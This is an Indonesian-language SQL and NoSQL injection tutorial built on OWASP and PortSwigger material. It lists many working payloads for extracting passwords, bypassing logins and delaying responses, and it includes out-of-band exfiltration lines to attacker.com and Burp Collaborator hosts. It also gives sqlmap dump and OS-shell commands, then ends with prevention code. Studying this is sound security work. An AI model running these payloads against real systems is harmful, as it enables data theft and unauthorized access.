SQL Injection Documentation

Dokumentasi lengkap tentang SQL Injection berdasarkan referensi dari OWASP, PortSwigger Web Security Academy, dan sumber terpercaya lainnya. Materi ini untuk keperluan pembelajaran security, CTF, dan penetration testing authorized.

Disclaimer: Materi ini hanya untuk tujuan edukasi dan security testing yang authorized. Penggunaan tanpa izin adalah ilegal dan dapat dikenai hukum.

Apa itu SQL Injection?

Menurut OWASP, SQL Injection (SQLi) adalah serangan yang terdiri dari penyisipan atau "injection" query SQL melalui input data dari client ke aplikasi. Serangan ini memanfaatkan fakta bahwa SQL tidak membedakan secara nyata antara control plane dan data plane.

PortSwigger mendefinisikan SQLi sebagai kerentanan keamanan web yang memungkinkan attacker mengganggu query yang dibuat aplikasi ke database-nya.

Cara Kerja SQL Injection

Contoh dari PortSwigger Web Security Academy:

Aplikasi shopping yang menampilkan produk berdasarkan kategori:

-- URL request
https://insecure-website.com/products?category=Gifts

-- Query yang dibuat aplikasi
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

-- Serangan SQL Injection
https://insecure-website.com/products?category=Gifts'--

-- Query hasil injection
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
-- Komentar (--) menghapus "AND released = 1", menampilkan SEMUA produk termasuk unreleased

Kondisi yang Menyebabkan Kerentanan

  • Data tidak terpercaya masuk ke program dari sumber eksternal
  • Data tersebut digunakan untuk membangun query SQL secara dinamis
  • Input user langsung digabung (concatenate) ke query string tanpa validasi
  • Error database ditampilkan ke user (information disclosure)

Lokasi SQL Injection dalam Query

Menurut PortSwigger, SQL injection dapat terjadi di berbagai bagian query, bukan hanya di WHERE clause:

  • WHERE clause pada SELECT statement
  • UPDATE statements - dalam values atau WHERE clause
  • INSERT statements - dalam inserted values
  • SELECT statements - dalam table atau column name
  • ORDER BY clause

Dampak Serangan SQL Injection

Berdasarkan OWASP, dampak serangan SQL injection mencakup:

Critical Confidentiality

Pencurian data sensitif dari database (password, credit card, informasi pribadi).

Critical Authentication

Bypass authentication, login sebagai user lain tanpa mengetahui password.

High Authorization

Mengubah informasi otorisasi, privilege escalation.

High Integrity

Modifikasi atau penghapusan data tanpa otorisasi.

Medium Admin Access

Menjadi administrator database server.

Critical RCE

Remote Code Execution pada beberapa database (MSSQL xp_cmdshell, dll).

PortSwigger: Serangan SQL injection telah digunakan dalam banyak data breach high-profile selama bertahun-tahun, menyebabkan kerusakan reputasi dan denda regulasi. Dalam beberapa kasus, attacker bisa mendapatkan backdoor persisten ke sistem organisasi.

Klasifikasi SQL Injection

SQL Injection diklasifikasikan berdasarkan bagaimana hasilnya dikembalikan ke attacker:

Kategori Type Deskripsi Visibility
In-Band Error-Based Data diekstrak dari error messages Visible
Union-Based Menggunakan UNION untuk menggabungkan hasil Visible
Blind (Inferential) Boolean-Based Inferensi dari TRUE/FALSE response Tidak Visible
Time-Based Inferensi dari response time delays Tidak Visible
Out-of-Band OOB SQLi Ekstraksi data via channel berbeda (DNS, HTTP) External

In-Band SQL Injection

In-Band SQL Injection adalah jenis yang paling umum dan mudah dieksploitasi. Attacker menggunakan channel komunikasi yang sama untuk menyerang dan mendapatkan hasil.

Error-Based SQL Injection

Serangan yang memanfaatkan error message dari database untuk mengekstrak informasi struktur database dan datanya.

MySQL Error-Based

-- EXTRACTVALUE - Extract database version
' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--
-- Output: XPATH syntax error: '~8.0.23~'

-- Extract database name
' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e))--

-- Extract table names
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()),0x7e))--

-- Extract column names
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e))--

-- UPDATEXML alternative
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1),0x7e),1)--

PostgreSQL Error-Based

-- CAST error untuk extract data
' AND 1=CAST((SELECT version()) AS INT)--
-- Output: invalid input syntax for integer: "PostgreSQL 13.3..."

-- Extract table name
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--

SQL Server Error-Based

-- CONVERT error
' AND 1=CONVERT(INT,(SELECT @@version))--

-- CAST error
' AND 1=CAST((SELECT TOP 1 table_name FROM information_schema.tables) AS INT)--

-- Extract dengan TOP
' AND 1=CONVERT(INT,(SELECT TOP 1 password FROM users))--

Oracle Error-Based

-- CTXSYS.DRITHSX.SN
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--

-- UTL_INADDR.GET_HOST_NAME
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))--

Union-Based SQL Injection

Menggunakan operator UNION untuk menggabungkan hasil query attacker dengan query asli. Teknik ini memungkinkan pengambilan data dari tabel lain.

Syarat UNION (PortSwigger):
  • Jumlah kolom harus sama di kedua query
  • Tipe data kolom harus compatible di setiap posisi

Step 1: Menentukan Jumlah Kolom

-- ORDER BY technique - increment until error
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--  -- Error = hanya 3 kolom

-- UNION NULL technique
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--  -- Jika tidak error = 3 kolom

Step 2: Menemukan Kolom dengan Tipe Data yang Sesuai

-- Test kolom mana yang bisa menampilkan string
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--

-- Jika kolom 2 bisa menampilkan string
' UNION SELECT NULL,'test',NULL--

Step 3: Ekstraksi Data

-- Database information
' UNION SELECT NULL,database(),version()--
' UNION SELECT NULL,user(),@@version--

-- Table names (MySQL)
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--

-- Column names (MySQL)
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract data
' UNION SELECT NULL,username,password FROM users--
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--

Database-Specific Enumeration Queries

MySQL SELECT @@version SELECT user() SELECT database() information_schema.tables
PostgreSQL SELECT version() SELECT current_user SELECT current_database() information_schema.tables
SQL Server SELECT @@version SELECT SYSTEM_USER SELECT DB_NAME() information_schema.tables

Database Query Result

Microsoft 'foo'+'bar' foobar
PostgreSQL 'foo'||'bar' foobar
MySQL 'foo' 'bar' (space) atau CONCAT('foo','bar') foobar

Blind SQL Injection

Menurut PortSwigger, Blind SQL injection terjadi ketika aplikasi tidak menampilkan hasil query atau error database dalam responsnya. Teknik yang lebih kompleks diperlukan untuk mengeksploitasi.

Teknik untuk Blind SQLi (PortSwigger):
  1. Mengubah logic query untuk memicu perbedaan response (TRUE/FALSE)
  2. Memicu time delay untuk inferensi berdasarkan response time
  3. Memicu out-of-band network interaction (OAST)

Boolean-Based (Blind) SQL Injection

Serangan di mana attacker menyimpulkan data dari perbedaan response TRUE vs FALSE.

Konsep Dasar

-- TRUE condition - response normal/berbeda dari FALSE
' AND 1=1--

-- FALSE condition - response berbeda
' AND 1=2--

-- Jika response berbeda, maka vulnerable

Subverting Application Logic

Contoh dari PortSwigger - Login Bypass:

-- Query normal
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

-- Dengan injection: username = administrator'--
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''

-- Password check dihilangkan oleh komentar (--)
-- Attacker login sebagai administrator tanpa password

Teknik Ekstraksi Data Karakter-per-Karakter

-- Cek panjang data
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=32--

-- Extract karakter per posisi dengan SUBSTRING
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='admin')='b'--

-- Menggunakan ASCII dengan binary search (lebih efisien)
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>64--
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>96--
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>112--
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')=97--

Substring Functions per Database

Database Function
Oracle SUBSTR('foobar', 4, 2)
Microsoft SUBSTRING('foobar', 4, 2)
PostgreSQL SUBSTRING('foobar', 4, 2)
MySQL SUBSTRING('foobar', 4, 2)
Tip: Dengan binary search, hanya butuh ~7 request untuk menemukan 1 karakter (dibanding ~128 request dengan linear search).

Conditional Errors (PortSwigger)

-- Oracle - trigger error jika kondisi TRUE
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual

-- Microsoft
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END

-- PostgreSQL
1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)

-- MySQL
SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')

Time-Based (Blind) SQL Injection

Serangan di mana attacker menyimpulkan data dari waktu response (delay). Berguna ketika tidak ada perbedaan response antara TRUE dan FALSE.

Time Delays (PortSwigger Cheat Sheet)

Database Unconditional Delay (10 detik)
Oracle dbms_pipe.receive_message(('a'),10)
Microsoft WAITFOR DELAY '0:0:10'
PostgreSQL SELECT pg_sleep(10)
MySQL SELECT SLEEP(10)

Conditional Time Delays

-- MySQL
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64,SLEEP(5),0)--

-- PostgreSQL
' AND SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END--

-- Microsoft
'; IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'--

-- Oracle
' AND SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual--

MySQL Time-Based Techniques

-- SLEEP function
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--

-- BENCHMARK function (alternative)
' AND BENCHMARK(10000000,SHA1('test'))--

-- Conditional dengan data extraction
' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--
Perhatian: Time-based SQLi menghasilkan banyak request dan bisa terdeteksi. Gunakan delay yang konsisten (misal 5 detik) untuk menghindari false positive dari network latency.

Out-of-Band SQL Injection

Serangan yang menggunakan channel berbeda (DNS, HTTP request) untuk mengekstraksi data. Sangat powerful dan bekerja ketika teknik lain tidak bisa.

DNS Lookup (PortSwigger Cheat Sheet)

Database Payload
Oracle SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
Microsoft exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
PostgreSQL copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
MySQL (Windows) LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')

DNS Lookup dengan Data Exfiltration

-- Oracle
SELECT EXTRACTVALUE(xmltype('
 %remote;]>'),'/l') FROM dual

-- Microsoft
declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);
exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')

-- MySQL (Windows)
' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\test'))--
Tools untuk OOB: Gunakan Burp Collaborator atau server sendiri dengan logging untuk menangkap OOB requests.

NoSQL Injection

Serangan injection pada database NoSQL (MongoDB, CouchDB, Redis, dll) yang memiliki karakteristik berbeda dari SQL tradisional.

MongoDB Injection

// Normal query
{ "username": "admin", "password": "password123" }

// Auth bypass dengan $ne (not equal)
{ "username": "admin", "password": { "$ne": "" } }
{ "username": "admin", "password": { "$ne": "wrong" } }

// $gt (greater than) - bypass
{ "username": "admin", "password": { "$gt": "" } }

// $regex - pattern matching
{ "username": "admin", "password": { "$regex": "^a" } }
{ "username": "admin", "password": { "$regex": ".*" } }

// $where - JavaScript injection (BERBAHAYA)
{ "$where": "this.password.match(/.*/)" }
{ "$where": "return this.username == 'admin'" }
{ "$where": "sleep(5000)" }  // Time-based

URL Parameter Injection

// Normal
?username=admin&password=password123

// Injection via URL parameter
?username=admin&password[$ne]=wrong
?username[$ne]=admin&password[$ne]=wrong
?username[$regex]=^a.*&password[$ne]=wrong

// Array injection
?username[]=admin&password[]=password

MongoDB Operators

Operator Deskripsi Contoh
$ne Not Equal {"field": {"$ne": "value"}}
$gt / $gte Greater Than / Equal {"field": {"$gt": 0}}
$lt / $lte Less Than / Equal {"field": {"$lt": 999}}
$regex Regular Expression {"field": {"$regex": "^a"}}
$exists Field Exists {"field": {"$exists": true}}
$where JavaScript Expression {"$where": "this.a > this.b"}
$in In Array {"field": {"$in": ["a","b"]}}
$nin Not In Array {"field": {"$nin": ["a","b"]}}

Second-Order SQL Injection

Menurut PortSwigger, Second-Order SQL Injection terjadi ketika aplikasi mengambil input user dari HTTP request dan menyimpannya untuk penggunaan di masa depan (biasanya di database), tanpa kerentanan terjadi pada saat penyimpanan data.

Kemudian, ketika menangani HTTP request yang berbeda, aplikasi mengambil data yang tersimpan dan memasukkannya ke dalam query SQL dengan cara yang tidak aman. Developer salah menganggap data tersebut sudah "trusted" karena sebelumnya disimpan dengan aman.

Contoh Second-Order SQLi:

-- Step 1: Register dengan username yang mengandung payload
Username: admin'--

-- Data disimpan di database tanpa masalah

-- Step 2: Admin melihat user list atau melakukan operasi lain
-- Query yang dijalankan:
SELECT * FROM users WHERE username = 'admin'--'

-- Payload dieksekusi pada query kedua!

Tools untuk SQL Injection

Recommended SQLMap

Tool otomatis paling populer untuk SQL injection detection dan exploitation.

# Basic usage
sqlmap -u "http://target.com?id=1"

# POST data
sqlmap -u "http://target.com/login" \
  --data="user=admin&pass=test"

# Specify parameter
sqlmap -u "http://target.com?id=1&cat=2" -p id

# With cookie
sqlmap -u "http://target.com?id=1" \
  --cookie="session=abc123"

# Dump all databases
sqlmap -u "http://target.com?id=1" --dbs

# Dump tables
sqlmap -u "http://target.com?id=1" \
  -D dbname --tables

# Dump data
sqlmap -u "http://target.com?id=1" \
  -D dbname -T users --dump

# OS shell
sqlmap -u "http://target.com?id=1" --os-shell

# Level dan risk
sqlmap -u "http://target.com?id=1" \
  --level=5 --risk=3

# Specific technique
sqlmap -u "http://target.com?id=1" \
  --technique=BEUST
# B=Boolean E=Error U=Union S=Stacked T=Time

Manual Testing Checklist

  1. Identifikasi semua input points (URL params, forms, headers, cookies)
  2. Test dengan single quote ' - cari error atau perubahan response
  3. Test dengan ' OR '1'='1 untuk auth bypass
  4. Test dengan ' AND '1'='2 untuk blind detection
  5. Determine column count dengan ORDER BY atau UNION NULL
  6. Identify visible columns
  7. Enumerate database info (version, user, database name)
  8. Enumerate tables dan columns
  9. Extract data
  10. Test stacked queries jika applicable
  11. Test file operations (read/write) jika privilege tinggi

Pencegahan SQL Injection

OWASP Warning: Escaping input dan stored procedures TIDAK cukup untuk mencegah semua jenis SQL injection. Metode yang disarankan adalah Parameterized Queries (Prepared Statements).

1. Parameterized Queries (Prepared Statements)

Menurut PortSwigger, sebagian besar besar SQL injection dapat dicegah menggunakan parameterized queries sebagai pengganti string concatenation.

// PHP - PDO (RECOMMENDED)
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
$stmt->execute([$username, $password]);

// PHP - MySQLi
$stmt = $conn->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
$stmt->bind_param('ss', $username, $password);
$stmt->execute();

// Python - psycopg2
cursor.execute('SELECT * FROM users WHERE username = %s AND password = %s', (username, password))

// Java - JDBC
PreparedStatement stmt = conn.prepareStatement('SELECT * FROM users WHERE username = ? AND password = ?');
stmt.setString(1, username);
stmt.setString(2, password);

// Node.js - mysql2
const [rows] = await connection.execute('SELECT * FROM users WHERE username = ? AND password = ?', [username, password]);
PortSwigger: Parameterized queries bisa digunakan untuk situasi di mana untrusted input muncul sebagai data dalam query. TIDAK bisa digunakan untuk table/column names atau ORDER BY clause - perlu pendekatan berbeda seperti whitelisting.

2. Input Validation (Whitelist)

// Whitelist validation
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
    die('Invalid username');
}

// Type casting untuk numeric
$id = (int) $_GET['id'];

// PHP filter functions
$email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);

3. Least Privilege Database User

-- Jangan gunakan root/sa untuk aplikasi!
CREATE USER 'appuser'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE ON appdb.* TO 'appuser'@'localhost';
-- Jangan berikan DROP, DELETE, atau FILE privilege

4. Additional Defenses

  • Disable error messages - Jangan tampilkan error database ke user
  • WAF - Web Application Firewall untuk filter dasar
  • Rate limiting - Limit requests untuk mencegah blind SQLi brute force
  • Logging & Monitoring - Monitor untuk suspicious patterns

NoSQL Prevention

// MongoDB - Sanitize operator
const sanitize = (input) => {
    if (typeof input === 'object') {
        for (let key in input) {
            if (key.startsWith('$')) {
                delete input[key];
            }
        }
    }
    return input;
};

// Express middleware
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize());

// Disable $where jika tidak diperlukan
db.adminCommand({ setParameter: 1, javascriptEnabled: false })
